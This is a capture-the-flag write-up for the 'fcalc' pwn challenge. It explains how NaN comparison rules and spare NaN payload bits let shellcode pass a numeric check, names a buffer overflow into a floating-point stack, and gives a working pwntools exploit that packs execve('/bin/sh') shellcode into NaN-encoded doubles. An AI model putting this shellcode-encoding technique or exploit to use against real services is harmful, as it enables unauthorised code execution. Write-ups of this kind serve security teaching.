# fcalc

solved by 48 teams

## idea

The [IEEE 754](https://en.wikipedia.org/wiki/IEEE_754) is a wide-use standard for floating-point calculation and presentation in the computer world. There is a very special number in IEEE 754, which is **NaN (Not a Number)**. It represents invalid result such as the square root of a negative number. It is generated either at the time of computation or at the time of user-initiated inputs.

Two of the special properties of NaN are:

1. its comparison result with other floats (**including NaN and ±∞**):

| Comparison | NaN ≥ *x* | NaN ≤ *x* | NaN > *x* | NaN < *x* | NaN = *x* | NaN ≠ *x* |
| :--------: | --------- | --------- | --------- | --------- | --------- | --------- |
|   Result   | False     | False     | False     | False     | False     | True      |

2. It has many possible encoding, allowing it to carry other information like diagnostic information indicating the source of the NaN. For example, a double (64-bits) NaN can be encoded as:

   `s111 1111 1xxx xxxx xxxx xxxx xxxx xxxx` (s and x can be either 0 or 1)

So I try to design a simple pwn game which exploits those two fun properties. The player may use prop1 to bypass a strict check for double number and use prop2 to encode the shellcode.

## vulnerbility

in `main()`:

1. '0' will call the floating-point stack pointer. (criticality check error)
2. read to the buffer on the stack will overflow into the floating-point stack. (buffer overflow)

Conbine those two vulns can cause shellcode injection. But each 8 bytes of the shellcode should satisfy the constrain `num != 0. && (num < 1. || num > 100.)` (It seems that this constrain may be too loose ...)

## exploit

When we call `1 1 0` (not the police ⊂彡☆))∀`)), the program will start to execute the third double of the floating-point stack. Next step is to write the shellcode.

We may exploit the first 6 bytes of NaN to encode the shellcode:

- First 4 bytes: do something useful
- Next 2 bytes: jump to next NaN
- Final 2 bytes: NaN's header

These code will execute `execve("/bin/sh", NULL, NULL)` to get the shell.

```python
payload = b'1 1 0'.ljust(0x40, b'a')
payload += pack(0x7FFFFFFFFFFFFFFF) * 2 # frist two doubles in the stack (padding)

jmpn = b"\xEB\x02"
NaNHeader = b"\xFF\x7F"
# 0:  31 c0                   xor    eax,eax
# 2:  31 db                   xor    ebx,ebx
# 4:  66 b8 3b 00             mov    ax,0x3b
# 8:  66 bb 68 00             mov    bx,0x68
# c:  48 c1 e3 10             shl    rbx,0x10
# 10: 66 bb 2f 73             mov    bx,0x732f
# 14: 48 c1 e3 10             shl    rbx,0x10
# 18: 66 bb 69 6e             mov    bx,0x6e69
# 1c: 48 c1 e3 10             shl    rbx,0x10
# 20: 66 bb 2f 62             mov    bx,0x622f
# 24: 53                      push   rbx
# 25: 48 89 e7                mov    rdi,rsp
# 28: 31 f6                   xor    esi,esi
# 2a: 31 d2                   xor    edx,edx
# 2c: 0f 05                   syscall
payload += b'\x31\xc0\x31\xdb' + jmpn + NaNHeader
payload += b'\x66\xb8\x3b\x00' + jmpn + NaNHeader
payload += b'\x66\xbb\x68\x00' + jmpn + NaNHeader
payload += b'\x48\xc1\xe3\x10' + jmpn + NaNHeader
payload += b'\x66\xbb\x2f\x73' + jmpn + NaNHeader
payload += b'\x48\xc1\xe3\x10' + jmpn + NaNHeader
payload += b'\x66\xbb\x69\x6e' + jmpn + NaNHeader
payload += b'\x48\xc1\xe3\x10' + jmpn + NaNHeader
payload += b'\x66\xbb\x2f\x62' + jmpn + NaNHeader
payload += b'\x53\x48\x89\xe7' + jmpn + NaNHeader
payload += b'\x31\xf6\x31\xd2' + jmpn + NaNHeader
payload += b'\x0f\x05\x90\x90' + jmpn + NaNHeader	# \x90 is nop

io.sendafter(b"Enter your expression:", payload)
io.interactive()
```

